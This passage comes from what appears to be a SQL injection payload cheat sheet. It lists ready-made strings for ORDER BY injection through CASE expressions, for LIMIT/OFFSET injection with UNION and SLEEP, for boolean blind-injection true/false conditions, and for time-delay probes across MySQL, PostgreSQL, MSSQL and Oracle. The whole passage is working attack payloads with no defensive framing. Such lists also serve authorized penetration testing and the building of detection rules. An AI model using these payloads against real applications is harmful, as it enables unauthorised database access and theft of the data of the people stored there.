-- Original: SELECT * FROM users ORDER BY id
CASE WHEN 1=1 THEN id ELSE name END
CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN id ELSE name END
(SELECT CASE WHEN 1=1 THEN 1 ELSE 1/(SELECT 0) END)
```

### LIMIT/OFFSET Injection

```
-- Original: SELECT * FROM users LIMIT 10
10, (SELECT COUNT(*) FROM users)
10 UNION SELECT 1,2,3
10 AND SLEEP(5)
```

## Blind Injection Conditions

### True/False Conditions

```
1 AND 1=1
1 AND '1'='1
1 AND TRUE
1 AND (SELECT 1)=1
1 AND (SELECT 'a')='a'
1 AND (SELECT 1 FROM DUAL)=1
```

### False Conditions

```
1 AND 1=2
1 AND '1'='2
1 AND FALSE
1 AND (SELECT 1)=2
1 AND (SELECT 'a')='b'
1 AND (SELECT 1 FROM DUAL)=2
```

### Delay Conditions

```
1 AND SLEEP(5)
1 AND pg_sleep(5)
1 AND WAITFOR DELAY '0:0:5'
1 AND dbms_lock.sleep(5)
```

